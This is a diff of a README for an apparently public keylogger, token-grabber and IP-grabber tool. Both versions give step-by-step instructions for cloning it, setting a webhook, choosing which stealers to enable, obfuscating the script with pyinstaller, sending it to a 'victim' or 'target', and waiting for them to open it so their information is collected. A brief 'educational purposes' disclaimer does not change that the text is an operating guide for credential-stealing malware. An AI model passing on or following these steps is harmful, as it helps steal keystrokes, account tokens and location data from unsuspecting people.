@@ -1,18 +1,20 @@
-# About 
- 
-```1. Install libraries
-2. Change the information in the main file, title, webhook, etc etc
-3. If you want to put anything off: KeyLogger, TokenGrabber, IPGrabber, you just have to edit the True to False in the bool of it
-4. Use pyinstaller and obfuscate the file, command: pyinstaller --onefile <filename.py>
-5. Take the obfuscated script from dist file (after proccess ended) and send it to your victim 
-6. Now just wait for him to open it and you will get the asked informations
-```
+# How to install and use
+
+1. Download and install python 3.9.1 for your OS (https://www.python.org/downloads)
+2. Open command prompt, use `cd (directory of choice, preferably desktop)` then copy paste `git clone https://github.com/ExtremeDude-tech/KeyLogger-TokenGrabber-IpGrabber && cd KeyLogger-TokenGrabber-IpGrabber`
+3. Change the information in the main file (title, webhook, etc.).
+4. If you want to turn anything off (KeyLogger, TokenGrabber, IPGrabber), change the `True` value of the boolean named the feature you want to turn off to `False`
+5. Use pyinstaller and obfuscate the file with `pyinstaller --onefile <filename.py>`
+6. Take the obfuscated script from dist file (after the proccess ended) and send it to your target
+7. Now just wait for them to open it and you will get the asked informations
+
+
 
 # Notes
 
-```This tool is coded for educational purpose, and it's not made for illegal stuff, so please use it only for purpose```
+```This tool is coded for educational purposes. Please refrain from using this for any illegal activities. The author of this program will NOT be held responsible for misuse.```
 
 # Credits
 
-```ExtremeDev```
-
+`ExtremeDev for base code`
+`AstroOrbis for Readme enhancements`
